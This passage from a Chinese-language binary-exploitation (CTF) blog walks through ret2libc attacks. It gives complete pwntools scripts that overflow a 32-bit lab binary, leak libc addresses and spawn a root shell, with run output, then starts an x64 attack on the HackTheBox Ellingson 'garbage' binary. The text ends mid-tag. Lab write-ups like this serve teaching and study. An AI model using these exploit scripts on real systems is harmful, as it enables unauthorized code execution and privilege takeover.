函数和\u003ccode\u003e/bin/sh\u003c/code\u003e字符串的地址\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\nfrom LibcSearcher import *\ne = ELF(\u003cspan class=\"hljs-string\"\u003e'./ret2libc3'\u003c/span\u003e)\nsh = process(\u003cspan class=\"hljs-string\"\u003e'./ret2libc3'\u003c/span\u003e)\nputs_plt_addr = e.plt[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nlibc_start_main_got_addr = e.got[\u003cspan class=\"hljs-string\"\u003e'__libc_start_main'\u003c/span\u003e]\nmain_addr = e.symbols[\u003cspan class=\"hljs-string\"\u003e'main'\u003c/span\u003e]\n\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'泄露 libc_start_main_got_addr 并返回到 main'\u003c/span\u003e)\npayload1 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_got_addr)\nsh.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Can you find it !?'\u003c/span\u003e,payload1)\nlibc_start_main_real_addr = u32(sh.recv()[0:4])\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"libc_start_main_real_addr:{hex(libc_start_main_real_addr)}\"\u003c/span\u003e)\n\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'得到 libc 版本，并计算基地址和 system \u0026#x26; /bin/sh 地址'\u003c/span\u003e)\nlibc = LibcSearcher(\u003cspan class=\"hljs-string\"\u003e\"__libc_start_main\"\u003c/span\u003e, libc_start_main_real_addr)\nlibcbase = libc_start_main_real_addr - libc.dump(\u003cspan class=\"hljs-string\"\u003e'__libc_start_main'\u003c/span\u003e)\nsystem_addr = libcbase + libc.dump(\u003cspan class=\"hljs-string\"\u003e'system'\u003c/span\u003e)\nbin_sh_addr = libcbase + libc.dump(\u003cspan class=\"hljs-string\"\u003e'/bin/sh'\u003c/span\u003e)\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e'基地址:{libcbase},system地址:{system_addr},/bin/sh地址:{bin_sh_addr}'\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里吐槽一下\u003ccode\u003eLibcSearcher\u003c/code\u003e ，一直提示\u003ccode\u003e[+] No libc satisfies constraints.\u003c/code\u003e 貌似\u003ccode\u003efork\u003c/code\u003e太久远了没更新\u003c/p\u003e\n\u003cp\u003e这里直接链接本地的\u003ccode\u003elibc\u003c/code\u003e库了，不使用\u003ccode\u003eLibcSearcher\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\ne = ELF(\u003cspan class=\"hljs-string\"\u003e'./ret2libc3'\u003c/span\u003e)\nlibc = ELF(\u003cspan class=\"hljs-string\"\u003e\"/lib32/libc.so.6\"\u003c/span\u003e)\nsh = process(\u003cspan class=\"hljs-string\"\u003e'./ret2libc3'\u003c/span\u003e)\nputs_plt_addr = e.plt[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nlibc_start_main_got_addr = e.got[\u003cspan class=\"hljs-string\"\u003e'__libc_start_main'\u003c/span\u003e]\nmain_addr = e.symbols[\u003cspan class=\"hljs-string\"\u003e'main'\u003c/span\u003e]\n\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'泄露 libc_start_main_got_addr 并返回到 main'\u003c/span\u003e)\npayload1 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_got_addr)\nsh.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Can you find it !?'\u003c/span\u003e,payload1)\nlibc_start_main_real_addr = u32(sh.recv()[0:4])\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"libc_start_main_real_addr:{hex(libc_start_main_real_addr)}\"\u003c/span\u003e)\n\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'计算基地址和 system \u0026#x26; /bin/sh 地址'\u003c/span\u003e)\nlibcbase = libc_start_main_real_addr - libc.sym[\u003cspan class=\"hljs-string\"\u003e'__libc_start_main'\u003c/span\u003e]\nsystem_addr = libcbase + libc.sym[\u003cspan class=\"hljs-string\"\u003e'system'\u003c/span\u003e]\nbin_sh_addr = libcbase + next(libc.search(b\u003cspan class=\"hljs-string\"\u003e\"/bin/sh\"\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e'基地址:{hex(libcbase)},system地址:{hex(system_addr)},/bin/sh地址:{hex(bin_sh_addr)}'\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e所有参数我们都有了，就可以构造\u003ccode\u003epayload\u003c/code\u003e了\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e方案 \u003ccode\u003e1\u003c/code\u003e（这里仿照\u003ccode\u003ewiki\u003c/code\u003e上的写）：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\ne = ELF(\u003cspan class=\"hljs-string\"\u003e'./ret2libc3'\u003c/span\u003e)\np = process(\u003cspan class=\"hljs-string\"\u003e'./ret2libc3'\u003c/span\u003e)\nlibc = ELF(\u003cspan class=\"hljs-string\"\u003e'/lib32/libc.so.6'\u003c/span\u003e)\n\nputs_plt_addr = e.plt[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nlibc_start_main_addr = e.got[\u003cspan class=\"hljs-string\"\u003e'__libc_start_main'\u003c/span\u003e]\nmain_addr = e.symbols[\u003cspan class=\"hljs-string\"\u003e'main'\u003c/span\u003e]\npayload1 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_addr)\np.sendlineafter(\u003cspan class=\"hljs-string\"\u003e\"Can you find it !?\"\u003c/span\u003e, payload1)\nlibc_start_main_real_addr = u32(p.recv()[0:4])\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"libc_start_main_real_addr = {hex(libc_start_main_real_addr)}\"\u003c/span\u003e)\n\nlibcbase = libc_start_main_real_addr - libc.sym[\u003cspan class=\"hljs-string\"\u003e'__libc_start_main'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"libcbase = {hex(libcbase)}\"\u003c/span\u003e)\nsystem_real_addr = libcbase + libc.sym[\u003cspan class=\"hljs-string\"\u003e'system'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"system_real_addr = {hex(system_real_addr)}\"\u003c/span\u003e)\nbin_sh_addr = libcbase + next(libc.search(b\u003cspan class=\"hljs-string\"\u003e\"/bin/sh\"\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"bin_sh_addr = {hex(bin_sh_addr)}\"\u003c/span\u003e)\npayload2 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 104+ p32(system_real_addr) + b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 4 + p32(bin_sh_addr)\np.sendline(payload2)\np.interactive()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e输出（失败了）：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  ret2libc python exp.py\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'\u003c/span\u003e\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n[+] Starting \u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e process \u003cspan class=\"hljs-string\"\u003e'./ret2libc3'\u003c/span\u003e: pid 4574\n[*] \u003cspan class=\"hljs-string\"\u003e'/lib32/libc.so.6'\u003c/span\u003e\n    Arch:       i386-32-little\n    RELRO:      Full RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/Tools/pwn/lib/python3.13/site-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  res = self.recvuntil(delim, \u003cspan class=\"hljs-built_in\"\u003etimeout\u003c/span\u003e=\u003cspan class=\"hljs-built_in\"\u003etimeout\u003c/span\u003e)\nlibc_start_main_real_addr = 0x206f4e0a\nlibcbase = 0x206d010a\nsystem_real_addr = 0x2072232a\nbin_sh_addr = 0x20896f5c\n[*] Switching to interactive mode\n[*] Got EOF \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e reading \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e interactive\n$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\n[*] Process \u003cspan class=\"hljs-string\"\u003e'./ret2libc3'\u003c/span\u003e stopped with \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e code -11 (SIGSEGV) (pid 4574)\n[*] Got EOF \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e sending \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e interactive\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e方案 2（大佬通过\u003ccode\u003eputs\u003c/code\u003e而不是\u003ccode\u003elibc_start_main\u003c/code\u003e ，并且二次返回到的更早之前）：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\ne = ELF(\u003cspan class=\"hljs-string\"\u003e'./ret2libc3'\u003c/span\u003e)\np = process(\u003cspan class=\"hljs-string\"\u003e'./ret2libc3'\u003c/span\u003e)\nlibc = ELF(\u003cspan class=\"hljs-string\"\u003e'/lib32/libc.so.6'\u003c/span\u003e)\n\nputs_plt_addr = e.plt[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nputs_got_addr = e.got[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nmain_addr = e.symbols[\u003cspan class=\"hljs-string\"\u003e'_start'\u003c/span\u003e]\npayload1 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(puts_got_addr)\np.sendlineafter(\u003cspan class=\"hljs-string\"\u003e\"Can you find it !?\"\u003c/span\u003e, payload1)\nputs_real_addr = u32(p.recv()[0:4])\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"puts_real_addr = {hex(puts_real_addr)}\"\u003c/span\u003e)\n\nlibcbase = puts_real_addr - libc.sym[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"libcbase = {hex(libcbase)}\"\u003c/span\u003e)\nsystem_real_addr = libcbase + libc.sym[\u003cspan class=\"hljs-string\"\u003e'system'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"system_real_addr = {hex(system_real_addr)}\"\u003c/span\u003e)\nbin_sh_addr = libcbase + next(libc.search(b\u003cspan class=\"hljs-string\"\u003e\"/bin/sh\"\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"bin_sh_addr = {hex(bin_sh_addr)}\"\u003c/span\u003e)\npayload2 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 112 + p32(system_real_addr) + b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 4 + p32(bin_sh_addr)\np.sendline(payload2)\np.interactive()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e输出（成功）：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  ret2libc python exp.py\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'\u003c/span\u003e\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n[+] Starting \u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e process \u003cspan class=\"hljs-string\"\u003e'./ret2libc3'\u003c/span\u003e: pid 4630\n[*] \u003cspan class=\"hljs-string\"\u003e'/lib32/libc.so.6'\u003c/span\u003e\n    Arch:       i386-32-little\n    RELRO:      Full RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/Tools/pwn/lib/python3.13/site-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  res = self.recvuntil(delim, \u003cspan class=\"hljs-built_in\"\u003etimeout\u003c/span\u003e=\u003cspan class=\"hljs-built_in\"\u003etimeout\u003c/span\u003e)\nputs_real_addr = 0xf7da72a0\nlibcbase = 0xf7d2b000\nsystem_real_addr = 0xf7d7d220\nbin_sh_addr = 0xf7ef1e52\n[*] Switching to interactive mode\n$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=0(root) gid=0(root) 组=0(root)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e方案3，修复\u003ccode\u003ewiki\u003c/code\u003e上的方案\u003c/p\u003e\n\u003cp\u003e不使用\u003ccode\u003e__libc_start_main\u003c/code\u003e 来获取第一个真实地址，而使用\u003ccode\u003eputs\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  ret2libc \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e exp.py\nfrom pwn import *\ne = ELF(\u003cspan class=\"hljs-string\"\u003e'./ret2libc3'\u003c/span\u003e)\np = process(\u003cspan class=\"hljs-string\"\u003e'./ret2libc3'\u003c/span\u003e)\nlibc = ELF(\u003cspan class=\"hljs-string\"\u003e'/lib32/libc.so.6'\u003c/span\u003e)\n\nputs_plt_addr = e.plt[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nlibc_start_main_addr = e.got[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nmain_addr = e.symbols[\u003cspan class=\"hljs-string\"\u003e'main'\u003c/span\u003e]\npayload1 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_addr)\np.sendlineafter(\u003cspan class=\"hljs-string\"\u003e\"Can you find it !?\"\u003c/span\u003e, payload1)\nlibc_start_main_real_addr = u32(p.recv()[0:4])\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"libc_start_main_real_addr = {hex(libc_start_main_real_addr)}\"\u003c/span\u003e)\n\nlibcbase = libc_start_main_real_addr - libc.sym[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"libcbase = {hex(libcbase)}\"\u003c/span\u003e)\nsystem_real_addr = libcbase + libc.sym[\u003cspan class=\"hljs-string\"\u003e'system'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"system_real_addr = {hex(system_real_addr)}\"\u003c/span\u003e)\nbin_sh_addr = libcbase + next(libc.search(b\u003cspan class=\"hljs-string\"\u003e\"/bin/sh\"\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"bin_sh_addr = {hex(bin_sh_addr)}\"\u003c/span\u003e)\npayload2 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 104+ p32(system_real_addr) + b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 4 + p32(bin_sh_addr)\np.sendline(payload2)\np.interactive()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e输出（成功）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  ret2libc python exp.py\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'\u003c/span\u003e\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n[+] Starting \u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e process \u003cspan class=\"hljs-string\"\u003e'./ret2libc3'\u003c/span\u003e: pid 6021\n[*] \u003cspan class=\"hljs-string\"\u003e'/lib32/libc.so.6'\u003c/span\u003e\n    Arch:       i386-32-little\n    RELRO:      Full RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/Tools/pwn/lib/python3.13/site-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  res = self.recvuntil(delim, \u003cspan class=\"hljs-built_in\"\u003etimeout\u003c/span\u003e=\u003cspan class=\"hljs-built_in\"\u003etimeout\u003c/span\u003e)\nlibc_start_main_real_addr = 0xf7d902a0\nlibcbase = 0xf7d14000\nsystem_real_addr = 0xf7d66220\nbin_sh_addr = 0xf7edae52\n[*] Switching to interactive mode\n$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=0(root) gid=0(root) 组=0(root)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e为什么第二次调用时使用\u003ccode\u003e104\u003c/code\u003e来填充栈而不是\u003ccode\u003e112\u003c/code\u003e？\u003c/p\u003e\n\u003cp\u003e因为程序真正的入口是\u003ccode\u003e_start\u003c/code\u003e，而不是\u003ccode\u003emain\u003c/code\u003e ，我们来看\u003ccode\u003e_start\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image21.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e调用\u003ccode\u003emain\u003c/code\u003e前会先调用\u003ccode\u003eand     esp, 0FFFFFFF0h\u003c/code\u003e 来使堆栈平衡\u003c/p\u003e\n\u003cp\u003e可以在 \u003ccode\u003e_start\u003c/code\u003e 处断点，然后\u003ccode\u003esi\u003c/code\u003e来一步一步调试查看 \u003ccode\u003eesp\u003c/code\u003e 的变化\u003c/p\u003e\n\u003cp\u003e第一次我们运行\u003ccode\u003epayload1\u003c/code\u003e的时候是直接从\u003ccode\u003e_start\u003c/code\u003e开始运行的，会经过\u003ccode\u003eand     esp, 0FFFFFFF0h\u003c/code\u003e 使堆栈平衡，使栈 \u003ccode\u003e+8\u003c/code\u003e 得到\u003ccode\u003e112\u003c/code\u003e ，但是我们第二次执行\u003ccode\u003epayload2\u003c/code\u003e不是从\u003ccode\u003e_start\u003c/code\u003e开始，直接从\u003ccode\u003emain\u003c/code\u003e开始，\u003ccode\u003eand\u003c/code\u003e不执行，所以没有\u003ccode\u003e+8\u003c/code\u003e ，所以此时esp到覆盖返回地址为\u003ccode\u003e112-8=104\u003c/code\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://xz.aliyun.com/news/14087\"\u003ehttps://xz.aliyun.com/news/14087\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e也可以说第一次运行 \u003ccode\u003e_start\u003c/code\u003e + \u003ccode\u003emain\u003c/code\u003e 一共 \u003ccode\u003e112\u003c/code\u003e ，而第二次直接从\u003ccode\u003emain\u003c/code\u003e开始一共用了\u003ccode\u003e104\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e方案\u003ccode\u003e1\u003c/code\u003e失败的原因是\u003c/h3\u003e\n\u003cp\u003e泄露的地址不正确（坏字符问题）\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003elibc_start_main_real_addr\u003c/code\u003e 的值是 \u003ccode\u003e0x206f4e0a\u003c/code\u003e。\u003ccode\u003eputs\u003c/code\u003e 函数是用来打印字符串的，它遇到 \u003ccode\u003e\\n\u003c/code\u003e (\u003ccode\u003e0x0a\u003c/code\u003e) 就会停止读取并输出换行符，然后返回。看一下这个地址 \u003ccode\u003e0x206f4e0a\u003c/code\u003e，它的最后一个字节是 \u003ccode\u003e0a\u003c/code\u003e，也就是换行符 \u003ccode\u003e\\n\u003c/code\u003e。这就导致解包出来的 \u003ccode\u003elibc_start_main_real_addr\u003c/code\u003e 是一个完全错误的值 \u003ccode\u003e0x206f4e0a\u003c/code\u003e\u003c/p\u003e\n\u003ch3\u003eret2libc - x64\u003c/h3\u003e\n\u003cp\u003e来自 \u003ccode\u003eHackTheBox - Ellingson\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e运行它的时候，会让你输入密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emargo@ellingson:~$ garbage\nEnter access password: 111111111111111111111111111111111111111111111111111111\n\naccess denied.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拉出去逆向看一眼\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eint __fastcall __noreturn main(int argc, const char **argv, const char **envp)\n{\n  int v3; // [rsp+8h] [rbp-8h] BYREF\n  unsigned int v4; // [rsp+Ch] [rbp-4h]\n\n  v4 = check_user(argc, argv, envp);\n  set_username(v4);\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( !(unsigned int)auth(v4) )\n    \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e(-1);\n  puts(\u003cspan class=\"hljs-string\"\u003e\"[+] W0rM || Control Application\"\u003c/span\u003e);\n  puts(\u003cspan class=\"hljs-string\"\u003e\"[+] ---------------------------\"\u003c/span\u003e);\n  puts(\u003cspan class=\"hljs-string\"\u003e\"Select Option\"\u003c/span\u003e);\n  puts(\u003cspan class=\"hljs-string\"\u003e\"1: Check Balance\"\u003c/span\u003e);\n  puts(\u003cspan class=\"hljs-string\"\u003e\"2: Launch\"\u003c/span\u003e);\n  puts(\u003cspan class=\"hljs-string\"\u003e\"3: Cancel\"\u003c/span\u003e);\n  puts(\u003cspan class=\"hljs-string\"\u003e\"4: Exit\"\u003c/span\u003e);\n  \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e ( 1 )\n  {\n    \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e ( 1 )\n    {\n      \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e ( 1 )\n      {\n        \u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"\u003e \"\u003c/span\u003e);\n        __isoc99_scanf(\u003cspan class=\"hljs-string\"\u003e\"%d%*c\"\u003c/span\u003e, \u0026#x26;v3);\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( v3 != 2 )\n          \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e;\n        launch();\n      }\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( v3 \u003e 2 )\n        \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e;\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( v3 != 1 )\n        goto LABEL_14;\n      checkbalance();\n    }\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( v3 != 3 )\n    {\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( v3 == 4 )\n        \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e(0);\nLABEL_14:\n      puts(\u003cspan class=\"hljs-string\"\u003e\"Unknown option\"\u003c/span\u003e);\n      \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e(-1);\n    }\n    cancel();\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们在开始运行的 \u003ccode\u003eauth\u003c/code\u003e 函数中发现了存在缓冲区溢出漏洞\u003c/p\u003e\n\u003cp\u003e也就是让我们输入密码的地方，会有缓冲区溢出，\u003ccode\u003egets()\u003c/code\u003e 函数会无限制地读取用户的输入，直到遇到换行符。如果攻击者输入一个超长的字符串（例如\u003ccode\u003e200\u003c/code\u003e个字符），多出来的\u003ccode\u003e100\u003c/code\u003e个字符就会溢出，覆盖掉栈上 \u003ccode\u003es1\u003c/code\u003e 相邻的其他数据。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e__int64 __fastcall auth(int a1)\n{\n  char dest[112]; // [rsp+10h] [rbp-F0h] BYREF\n  char s1[100]; // [rsp+80h] [rbp-80h] BYREF\n  char v4[12]; // [rsp+E4h] [rbp-1Ch] BYREF\n  int v5; // [rsp+F0h] [rbp-10h]\n\n  v5 = a1;\n  strcpy(v4, username);\n  \u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Enter access password: \"\u003c/span\u003e);\n  gets(s1);\n  putchar(10);\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( !strcmp(s1, \u003cspan class=\"hljs-string\"\u003e\"N3veRF3@r1iSh3r3!\"\u003c/span\u003e) )\n  {\n    strcpy(dest, \u003cspan class=\"hljs-string\"\u003e\"access granted for user: \"\u003c/span\u003e);\n    strcat(dest, v4);\n    syslog(6, dest);\n    puts(\u003cspan class=\"hljs-string\"\u003e\"access granted.\"\u003c/span\u003e);\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 1LL;\n  }\n  \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e\n  {\n    puts(\u003cspan class=\"hljs-string\"\u003e\"access denied.\"\u003c/span\u003e);\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 0LL;\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e64\u003c/code\u003e位程序\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Ellingson file garbage \ngarbage: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e GNU/Linux 3.2.0, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, not stripped\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e保护措施情况，开启了\u003ccode\u003eNX\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Ellingson checksec garbage \n[*] Checking \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e new versions of pwntools\n    To \u003cspan class=\"hljs-built_in\"\u003edisable\u003c/span\u003e this functionality, \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e the contents of /root/.cache/.pwntools-cache-3.13/update to \u003cspan class=\"hljs-string\"\u003e'never'\u003c/span\u003e (old way).\n    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):\n        [update]\n        interval=never\n[*] You have the latest version of Pwntools (4.14.1)\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Ellingson/garbage'\u003c/span\u003e\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e检查一下是否开启了 \u003ccode\u003eALSR\u003c/code\u003e ，开启了完全\u003ccode\u003eALSR\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emargo@ellingson:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /proc/sys/kernel/randomize_va_space\n2\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里要使用 \u003ccode\u003eret2libc\u003c/code\u003e 攻击\u003c/p\u003e\n\u003cp\u003e寻找一个真实的地址，首先我们查看\u003ccode\u003elibc\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs 